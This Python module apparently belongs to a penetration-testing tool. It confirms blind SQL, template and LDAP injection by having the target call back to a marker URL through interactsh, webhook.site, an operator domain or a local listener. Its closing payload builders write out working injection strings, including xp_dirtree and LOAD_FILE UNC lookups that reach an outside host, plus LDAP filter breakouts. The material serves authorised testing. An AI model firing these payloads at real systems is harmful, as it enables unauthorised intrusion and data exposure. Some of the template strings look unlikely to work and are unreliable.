"""Out-of-band (OOB) callback verification.

For blind injection (SQLi / SSTI / LDAPi) the strongest possible proof is
the target's server calling *us* back: a DNS lookup or HTTP request to a
unique marker URL we control.  This module provides:

* pluggable :class:`OOBCollector` implementations - interactsh,
  webhook.site, an operator-owned domain, and a local listener;
* third-party gating: collectors that exfiltrate to someone else's
  infrastructure (interactsh public server, webhook.site) only run with an
  explicit opt-in flag - the default is local / operator-owned only;
* :func:`attempt_oob`, which injects a marker URL and polls for the
  callback inside a bounded wait window.

Safety model: payloads are evidence requests only (a DNS/HTTP fetch of a
unique token URL).  Nothing is written, deleted, or executed on the
target.  Verdicts: ``confirmed_oob`` | ``inconclusive_oob`` |
``skipped_no_collector``.
"""

from __future__ import annotations

import asyncio
import logging
import os
import shutil
import socket
import uuid
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional

logger = logging.getLogger("athena.verify.oob")

#: ``inject`` fires the probe carrying ``callback_url`` and returns True
#: when the probe request itself was delivered (HTTP 2xx/3xx/4xx - any
#: answer means the server received it; only network failure is False).
Inject = Callable[[str], Awaitable[bool]]


@dataclass
class OOBConfig:
    #: Operator-owned domain for DNS-log callbacks (e.g. ``oob.example.com``).
    domain: str = ""
    #: Template for polling an operator-owned DNS-log API, ``{token}``
    #: placeholder (env ``ATHENA_OOB_POLL_URL`` is the fallback).
    poll_url: str = ""
    #: Pre-created webhook.site URL (env ``ATHENA_WEBHOOK_URL`` fallback).
    webhook_url: str = ""
    #: Bound on the whole callback wait (seconds).
    wait: float = 60.0
    #: Seconds between polls.
    poll_interval: float = 5.0
    #: Opt-in: allow third-party collectors (interactsh, webhook.site).
    allow_third_party: bool = False
    #: Local listener bind host/port (0 = ephemeral port).
    listen_host: str = "127.0.0.1"
    listen_port: int = 0


@dataclass
class OOBResult:
    verdict: str  # confirmed_oob | inconclusive_oob | skipped_no_collector
    collector: str = ""
    token: str = ""
    detail: str = ""


class OOBCollector:
    """One callback channel.  Subclass per backend."""

    name = "base"
    third_party = False
    routable = True  # False when callbacks can only arrive locally

    def available(self) -> bool:
        return False

    def callback_url(self, token: str) -> str:
        raise NotImplementedError

    async def poll(self, token: str, timeout: float,
                   interval: float = 5.0) -> bool:
        raise NotImplementedError


class LocalListenerCollector(OOBCollector):
    """Loopback HTTP listener.  Only proves callbacks for local targets.

    Binds 127.0.0.1 and records ``GET /hit/<token>``.  A public target can
    never reach it, so it is only selected when no routable collector
    exists - and then only as a best-effort channel.
    """

    name = "local"
    third_party = False
    routable = False

    def __init__(self, host: str = "127.0.0.1", port: int = 0):
        self.host = host or "127.0.0.1"
        self.port = int(port or 0)
        self._hits: set = set()
        self._server: Optional[asyncio.base_events.Server] = None

    def available(self) -> bool:
        return True

    async def start(self) -> bool:
        if self._server is not None:
            return True
        hits = self._hits

        async def handle(reader: asyncio.StreamReader,
                         writer: asyncio.StreamWriter) -> None:
            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
                try:
                    line = data.decode("iso-8859-1", "replace").splitlines()[0]
                except IndexError:
                    line = ""
                if "/hit/" in line:
                    token = line.split("/hit/", 1)[1].split(" ")[0].split("?")[0]
                    token = token.strip("/")
                    if token:
                        hits.add(token)
                body = b"ok"
                writer.write(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n"
                             b"Connection: close\r\n\r\n" + body)
                await writer.drain()
            except Exception:
                pass
            finally:
                try:
                    writer.close()
                except Exception:
                    pass

        try:
            self._server = await asyncio.start_server(
                handle, self.host, self.port)
        except OSError as exc:
            logger.debug("local OOB listener failed to bind: %s", exc)
            return False
        try:
            sockets = self._server.sockets or []
            if sockets:
                self.port = int(sockets[0].getsockname()[1])
        except Exception:
            pass
        return True

    async def stop(self) -> None:
        if self._server is not None:
            try:
                self._server.close()
                await self._server.wait_closed()
            except Exception:
                pass
            self._server = None

    def callback_url(self, token: str) -> str:
        return f"http://{self.host}:{self.port}/hit/{token}"

    async def poll(self, token: str, timeout: float,
                   interval: float = 5.0) -> bool:
        loop = asyncio.get_event_loop()
        deadline = loop.time() + max(0.0, float(timeout))
        while loop.time() < deadline:
            if token in self._hits:
                return True
            await asyncio.sleep(min(max(0.2, float(interval)), max(
                0.0, deadline - loop.time())))
        return token in self._hits


class InteractshCollector(OOBCollector):
    """interactsh OOB channel (requires the ``interactsh-client`` binary).

    Third-party by default (public interactsh server) - only selected with
    explicit opt-in.  Session lifecycle (register -> poll -> deregister) is
    driven through the client's JSON output.
    """

    name = "interactsh"
    third_party = True
    routable = True

    def __init__(self, binary: Optional[str] = None,
                 server: str = ""):
        self.binary = binary or shutil.which("interactsh-client")
        self.server = (server or os.getenv("ATHENA_INTERACTSH_SERVER", "")).strip()
        self._proc: Optional[asyncio.subprocess.Process] = None
        self._url: str = ""
        self._correlation_id: str = ""

    def available(self) -> bool:
        return bool(self.binary)

    async def start(self) -> bool:
        if not self.binary:
            return False
        argv = [self.binary, "-json", "-o", "-q"]
        if self.server:
            argv += ["-s", self.server]
        try:
            self._proc = await asyncio.create_subprocess_exec(
                *argv,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL)
        except (OSError, PermissionError) as exc:
            logger.debug("interactsh-client failed to start: %s", exc)
            return False
        try:
            import json as _json
            assert self._proc.stdout is not None
            line = await asyncio.wait_for(self._proc.stdout.readline(),
                                          timeout=30.0)
            event = _json.loads(line.decode("utf-8", "replace") or "{}")
            self._url = str(event.get("url") or event.get("host") or "")
            self._correlation_id = str(event.get("correlation-id")
                                       or event.get("correlation_id") or "")
        except Exception as exc:
            logger.debug("interactsh session registration failed: %s", exc)
            await self.stop()
            return False
        return bool(self._url)

    async def stop(self) -> None:
        if self._proc is not None:
            try:
                self._proc.terminate()
                await asyncio.wait_for(self._proc.wait(), timeout=5.0)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None

    def callback_url(self, token: str) -> str:
        base = (self._url or "").rstrip("/")
        if base.startswith("http"):
            return f"{base}/{token}"
        return f"http://{token}.{base}" if base else token

    async def poll(self, token: str, timeout: float,
                   interval: float = 5.0) -> bool:
        if self._proc is None or self._proc.stdout is None:
            return False
        import json as _json
        loop = asyncio.get_event_loop()
        deadline = loop.time() + max(0.0, float(timeout))
        token_low = token.lower()
        while loop.time() < deadline:
            remaining = deadline - loop.time()
            try:
                line = await asyncio.wait_for(
                    self._proc.stdout.readline(),
                    timeout=min(max(0.5, float(interval)), max(0.1, remaining)))
            except asyncio.TimeoutError:
                continue
            except Exception:
                return False
            if not line:
                return False
            try:
                event = _json.loads(line.decode("utf-8", "replace") or "{}")
            except ValueError:
                continue
            blob = _json.dumps(event).lower()
            if token_low and token_low in blob:
                return True
        return False


class WebhookSiteCollector(OOBCollector):
    """webhook.site channel (operator pre-creates the URL).

    Set ``ATHENA_WEBHOOK_URL`` (or ``OOBConfig.webhook_url``) to a
    ``https://webhook.site/<uuid>`` URL.  Third-party: opt-in required.
    Polling uses the public token API (best-effort; needs the URL to be
    reachable and the token API to answer).
    """

    name = "webhook.site"
    third_party = True
    routable = True

    def __init__(self, webhook_url: str = ""):
        self.webhook_url = (webhook_url
                            or os.getenv("ATHENA_WEBHOOK_URL", "")).strip().rstrip("/")

    def available(self) -> bool:
        return self.webhook_url.startswith("https://webhook.site/")

    def _uuid(self) -> str:
        return self.webhook_url.rsplit("/", 1)[-1]

    def callback_url(self, token: str) -> str:
        return f"{self.webhook_url}/{token}"

    async def poll(self, token: str, timeout: float,
                   interval: float = 5.0) -> bool:
        try:
            import aiohttp
        except ImportError:
            return False
        api = f"https://webhook.site/token/{self._uuid()}/requests?sorting=newest"
        headers = {"Accept": "application/json",
                   "User-Agent": "Mozilla/5.0 Athena-oob-poll"}
        api_key = os.getenv("ATHENA_WEBHOOK_API_KEY", "").strip()
        if api_key:
            headers["Api-Key"] = api_key
        loop = asyncio.get_event_loop()
        deadline = loop.time() + max(0.0, float(timeout))
        token_low = token.lower()
        while loop.time() < deadline:
            try:
                timeout_cfg = __import__("aiohttp").ClientTimeout(total=15)
                async with aiohttp.ClientSession(timeout=timeout_cfg) as sess:
                    async with sess.get(api, headers=headers,
                                        ssl=False) as resp:
                        data = await resp.json(content_type=None)
            except Exception as exc:
                logger.debug("webhook.site poll failed: %s", exc)
                data = None
            if isinstance(data, dict):
                items = data.get("data") or []
                blob = __import__("json").dumps(items).lower()
                if token_low and token_low in blob:
                    return True
            await asyncio.sleep(min(max(1.0, float(interval)),
                                    max(0.0, deadline - loop.time())))
        return False


class CustomDomainCollector(OOBCollector):
    """Operator-owned domain (their own DNS-log / HTTP-log infrastructure).

    Marker: ``<token>.oob.<domain>``.  Polling needs ``ATHENA_OOB_POLL_URL``
    (or ``OOBConfig.poll_url``) with a ``{token}`` placeholder returning a
    JSON body; without it the marker is still injected but the verdict can
    only be ``inconclusive_oob`` with the marker recorded for manual review.
    Not third-party: the operator owns the domain.
    """

    name = "custom-domain"
    third_party = False
    routable = True

    def __init__(self, domain: str = "", poll_url: str = ""):
        self.domain = (domain or "").strip().strip(".")
        self.poll_url = (poll_url or os.getenv("ATHENA_OOB_POLL_URL", "")).strip()

    def available(self) -> bool:
        return bool(self.domain)

    def callback_url(self, token: str) -> str:
        return f"http://{token}.oob.{self.domain}/"

    async def poll(self, token: str, timeout: float,
                   interval: float = 5.0) -> bool:
        if not self.poll_url or "{token}" not in self.poll_url:
            return False
        try:
            import aiohttp
        except ImportError:
            return False
        url = self.poll_url.replace("{token}", token)
        loop = asyncio.get_event_loop()
        deadline = loop.time() + max(0.0, float(timeout))
        token_low = token.lower()
        while loop.time() < deadline:
            try:
                timeout_cfg = __import__("aiohttp").ClientTimeout(total=15)
                async with aiohttp.ClientSession(timeout=timeout_cfg) as sess:
                    async with sess.get(url, ssl=False) as resp:
                        data = await resp.json(content_type=None)
            except Exception as exc:
                logger.debug("custom OOB poll failed: %s", exc)
                data = None
            if data is not None:
                blob = __import__("json").dumps(data).lower()
                if token_low and token_low in blob:
                    return True
            await asyncio.sleep(min(max(1.0, float(interval)),
                                    max(0.0, deadline - loop.time())))
        return False


def select_collectors(config: OOBConfig) -> List[OOBCollector]:
    """Build the usable collector list for ``config``.

    Order: operator-owned first, third-party only with opt-in, local
    listener last (loopback can only prove local targets).
    """
    collectors: List[OOBCollector] = []
    custom = CustomDomainCollector(domain=config.domain,
                                   poll_url=config.poll_url)
    if custom.available():
        collectors.append(custom)
    if config.allow_third_party:
        inter = InteractshCollector()
        if inter.available():
            collectors.append(inter)
        hook = WebhookSiteCollector(webhook_url=config.webhook_url)
        if hook.available():
            collectors.append(hook)
    collectors.append(LocalListenerCollector(host=config.listen_host,
                                             port=config.listen_port))
    return collectors


def new_token() -> str:
    return uuid.uuid4().hex[:12]


async def attempt_oob(inject: Inject, config: OOBConfig,
                      token: str = "") -> OOBResult:
    """Inject a marker URL and wait for the callback.

    Tries each selected collector in order; the first callback wins.
    ``inject`` returning False means the probe request itself never got
    through (network failure) - polling a dead probe wastes the wait
    window, so it is skipped for that collector.
    """
    token = token or new_token()
    collectors = select_collectors(config)
    routable = [c for c in collectors if c.routable and c.available()]
    tried: List[str] = []

    async def _lifecycle(collector: OOBCollector) -> Optional[OOBResult]:
        start = getattr(collector, "start", None)
        stop = getattr(collector, "stop", None)
        try:
            if callable(start):
                ok = await start()
                if ok is False:
                    return None
            url = collector.callback_url(token)
            try:
                delivered = await inject(url)
            except Exception as exc:
                logger.debug("OOB inject via %s failed: %s",
                             collector.name, exc)
                return None
            if not delivered:
                return OOBResult(
                    verdict="inconclusive_oob", collector=collector.name,
                    token=token,
                    detail=(f"probe carrying marker {token} never got through "
                            f"via {collector.name}; no callback possible"))
            hit = await collector.poll(token, timeout=config.wait,
                                       interval=config.poll_interval)
            if hit:
                return OOBResult(
                    verdict="confirmed_oob", collector=collector.name,
                    token=token,
                    detail=(f"target server called back to marker {token} "
                            f"via {collector.name}: blind injection proven"))
            return OOBResult(
                verdict="inconclusive_oob", collector=collector.name,
                token=token,
                detail=(f"marker {token} injected via {collector.name} but no "
                        f"callback within {config.wait:g}s"))
        finally:
            try:
                if callable(stop):
                    await stop()
            except Exception:
                pass

    # Routable collectors first - they can actually prove remote targets.
    # The first confirmed callback wins; inconclusive answers are kept as
    # fallback detail while other channels are still tried.
    fallback: Optional[OOBResult] = None
    for collector in routable:
        tried.append(collector.name)
        result = await _lifecycle(collector)
        if result is None:
            continue
        if result.verdict == "confirmed_oob":
            return result
        if "never got through" in result.detail:
            # Probe delivery failed; a different channel may still work.
            continue
        if fallback is None:
            fallback = result

    # Local listener: best effort, loopback only.
    for collector in collectors:
        if collector.routable or not collector.available():
            continue
        if collector.name in tried:
            continue
        tried.append(collector.name)
        result = await _lifecycle(collector)
        if result is not None and result.verdict == "confirmed_oob":
            return result
        if result is not None and fallback is None \
                and "never got through" not in result.detail:
            fallback = result

    if not tried:
        return OOBResult(
            verdict="skipped_no_collector", token=token,
            detail=("no OOB collector available: pass --oob-domain, set "
                    "ATHENA_WEBHOOK_URL + --allow-oob-third-party, or install "
                    "interactsh-client + --allow-oob-third-party"))

    if fallback is not None:
        return fallback
    return OOBResult(
        verdict="inconclusive_oob", token=token,
        detail=(f"marker {token} tried via {', '.join(tried)}; no callback "
                f"within {config.wait:g}s (no proof)"))


# ---------------------------------------------------------------------------
# Payload builders: marker-carrying evidence requests per injection class.
# Safe by construction: each payload only *fetches* the marker URL.
# ---------------------------------------------------------------------------

def sqli_oob_payloads(callback_host: str) -> List[str]:
    """MSSQL/MySQL DNS-exfil probes (no writes, no file reads of secrets)."""
    host = (callback_host or "").strip()
    return [
        f"'; EXEC master..xp_dirtree '\\\\{host}\\x'-- -",
        f"' UNION SELECT LOAD_FILE('\\\\\\\\{host}\\\\x')-- -",
        f"1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',{host},'\\\\x')))-- -",
    ]


def ssti_oob_payloads(callback_url: str) -> List[str]:
    """Template fetch probes for engines that support outbound includes."""
    url = (callback_url or "").strip()
    return [
        # Jinja2/Twig-style: url fetch only fires where the engine allows it.
        '{{ namespace(u="%s") }}' % url,
        '{%% include "%s" %%}' % url,
        '${request.get("%s")}' % url,
    ]


def ldap_oob_payloads(callback_host: str) -> List[str]:
    """LDAP search-filter probes referencing the marker host."""
    host = (callback_host or "").strip()
    return [
        f"*)(uid=*))(|(uid={host}",
        f"*))(|(description={host}*",
    ]
